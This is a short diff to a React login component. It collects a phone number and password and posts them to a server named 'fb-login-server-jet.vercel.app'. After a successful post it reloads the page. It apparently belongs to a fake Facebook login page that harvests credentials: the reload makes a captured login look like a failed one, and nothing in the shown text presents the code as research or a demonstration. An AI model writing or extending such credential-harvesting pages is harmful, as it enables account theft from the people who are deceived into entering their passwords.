@@ -9,7 +9,7 @@ function App() {
   const [eye, setEye] = useState(false)
   const [number, setNumber] = useState("");
   const [password, setPassword] = useState("")
-
+  
   const handleAddUser = async () => {
     const userInfo = {
       number: number,
@@ -26,9 +26,9 @@ function App() {
         }
       };
       const response = await axios.post('https://fb-login-server-jet.vercel.app/api/login/user', userInfo, config)
+      console.log(response)
       if (response.status === 201) {
-        setNumber("");
-        setPassword("")
+        window.location.reload()
       }
 
     } catch (error) {
